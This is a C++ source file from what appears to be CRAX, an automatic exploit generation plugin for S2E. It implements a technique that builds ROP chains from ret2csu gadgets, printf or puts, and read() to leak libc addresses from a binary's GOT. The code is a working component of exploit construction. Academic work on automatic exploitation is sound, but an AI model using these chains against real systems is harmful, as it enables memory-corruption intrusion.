// Copyright 2021-2022 Software Quality Laboratory, NYCU.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/CRAX/CRAX.h>
#include <s2e/Plugins/CRAX/Exploit.h>
#include <s2e/Plugins/CRAX/API/Disassembler.h>
#include <s2e/Plugins/CRAX/Techniques/Ret2csu.h>
#include <s2e/Plugins/CRAX/Utils/StringUtil.h>

#include <cassert>
#include <algorithm>
#include <vector>

#include "GotLeakLibc.h"

namespace s2e::plugins::crax {

GotLeakLibc::GotLeakLibc() : Technique() {
    const Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();

    m_requiredGadgets.push_back(std::make_pair(&elf, "pop rdi ; ret"));
}


void GotLeakLibc::initialize() {
    resolveRequiredGadgets();
}

bool GotLeakLibc::checkRequirements() const {
    const auto &sym = g_crax->getExploit().getElf().symbols();

    // read() must be present in the GOT of the target binary.
    return Technique::checkRequirements() && sym.find("read") != sym.end();
}

void GotLeakLibc::resolveRequiredGadgets() {
    Technique::resolveRequiredGadgets();

    Exploit &exploit = g_crax->getExploit();
    exploit.registerSymbol("got_leak_libc_fmt_str", exploit.getElf().bss() + 0x600);
}

std::vector<RopSubchain> GotLeakLibc::getRopSubchains() const {
    Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();
    const ELF &libc = exploit.getLibc();

    // A symbol is blacklisted usually because its runtime address
    // won't be resolved under normal circumstances. For example,
    // __stack_chk_fail shouldn't be called at all, otherwise we
    // won't be able to reach the exploitable state.
    static const std::vector<std::string> blacklistedSyms = {
        "__stack_chk_fail",
    };

    assert(elf.plt().size() && "PLT is empty ?_?");
    std::string targetSym;

    for (const auto &entry : elf.plt()) {
        // Only use this PLT entry if its symbol is not blacklisted.
        if (std::none_of(blacklistedSyms.begin(),
                         blacklistedSyms.end(),
                         [&entry](const std::string &s) { return entry.first == s; })) {
            targetSym = entry.first;
            break;
        }
    }

    assert(targetSym.size() && "No suitable candiate for leaking libc base from GOT?");

    std::vector<RopSubchain> ret;

    if (elf.plt().find("printf") != elf.plt().end()) {
        ret = getRopSubchainsForPrintf(targetSym);
    } else if (elf.plt().find("puts") != elf.plt().end()) {
        ret = getRopSubchainsForPuts(targetSym);
    }

    assert(ret.size() && "GotLeakLibc: no supported read primitive :(");

    ret.push_back({
        LambdaExpr::create([&exploit, &libc, targetSym]() {
            exploit.writeLeakLibcBase(libc.symbols().at(targetSym));
            exploit.writeline();
        })
    });

    return ret;
}

std::vector<RopSubchain>
GotLeakLibc::getRopSubchainsForPrintf(const std::string &targetSym) const {
    Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();

    auto ret2csu = g_crax->getTechnique<Ret2csu>();
    assert(ret2csu);

    // Write "%s\n\x00" to somewhere in .bss, so that we can
    // leak 8 bytes from an entry of GOT with printf().
    // read(0, elf_base + elf.bss() + n, 3)
    std::string fmtStr = "%s\n";
    fmtStr.push_back('\x00');

    RopSubchain read1 = ret2csu->getRopSubchains(
        BaseOffsetExpr::create(elf, "sym", "read"),
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create(exploit, elf, "got_leak_libc_fmt_str"),
        ConstantExpr::create(fmtStr.size(), Expr::Int64))[0];

    // read(0, 0, 0), setting RAX to 0 and RDI to 1.
    RopSubchain read2 = ret2csu->getRopSubchains(
        BaseOffsetExpr::create(elf, "sym", "read"),
        ConstantExpr::create(1, Expr::Int64),
        ConstantExpr::create(0, Expr::Int64),
        ConstantExpr::create(0, Expr::Int64))[0];

    // Set RSI to elf.got['read'], returning to `pop rdi ; ret`.
    RopSubchain prep = ret2csu->getRopSubchains(
        BaseOffsetExpr::create(exploit, elf, Exploit::toVarName("pop rdi ; ret")),
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create(elf, "got", targetSym),
        ConstantExpr::create(0, Expr::Int64))[0];

    RopSubchain leak = {
        BaseOffsetExpr::create(exploit, elf, "got_leak_libc_fmt_str"),
        BaseOffsetExpr::create(elf, "sym", "printf")
    };

    // Prepare to chain the current subchain with the next one by calling
    // read(0, ropReadDstOffset, 0x400).
    uint64_t read3Size = read1.size();
    uint64_t ropReadDstOffset
        = sizeof(uint64_t) * (read1.size() + read2.size() + prep.size() + leak.size() + read3Size);

    RopSubchain read3 = ret2csu->getRopSubchains(
        BaseOffsetExpr::create(elf, "sym", "read"),
        ConstantExpr::create(0, Expr::Int64),
        PlaceholderExpr<uint64_t>::create(ropReadDstOffset),
        ConstantExpr::create(0x400, Expr::Int64))[0];

    RopSubchain part1;
    RopSubchain part2 = { ByteVectorExpr::create(fmtStr) };

    part1.reserve(1 + read1.size() + read2.size() + prep.size() + leak.size() + read3.size());
    part1.push_back(ConstantExpr::create(0, Expr::Int64));  // RBP
    part1.insert(part1.end(), read1.begin(), read1.end());
    part1.insert(part1.end(), read2.begin(), read2.end());
    part1.insert(part1.end(), prep.begin(), prep.end());
    part1.insert(part1.end(), leak.begin(), leak.end());
    part1.insert(part1.end(), read3.begin(), read3.end());

    return { part1, part2 };
}

std::vector<RopSubchain>
GotLeakLibc::getRopSubchainsForPuts(const std::string &targetSym) const {
    Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();

    auto ret2csu = g_crax->getTechnique<Ret2csu>();
    assert(ret2csu);

    RopSubchain part1 = {
        ConstantExpr::create(0, Expr::Int64),  // RBP
        BaseOffsetExpr::create(exploit, elf, Exploit::toVarName("pop rdi ; ret")),
        BaseOffsetExpr::create(elf, "got", targetSym),
        BaseOffsetExpr::create(elf, "sym", "puts")
    };

    // XXX: Don't hardcode the offset!
    // p64(elf_base + pivot_dest + 0x30 * 10 + 16)
    RopSubchain read1 = ret2csu->getRopSubchains(
        BaseOffsetExpr::create(elf, "sym", "read"),
        ConstantExpr::create(0, Expr::Int64),
        AddExpr::alloc(
            BaseOffsetExpr::create(exploit, elf, "pivot_dest"),
            AddExpr::alloc(
                MulExpr::alloc(
                    ConstantExpr::create(0x30, Expr::Int64),
                    ConstantExpr::create(10, Expr::Int64)),
                ConstantExpr::create(16, Expr::Int64))),
        ConstantExpr::create(0x400, Expr::Int64))[0];

    part1.insert(part1.end(), read1.begin(), read1.end());

    return { part1 };
}

}  // namespace s2e::plugins::crax
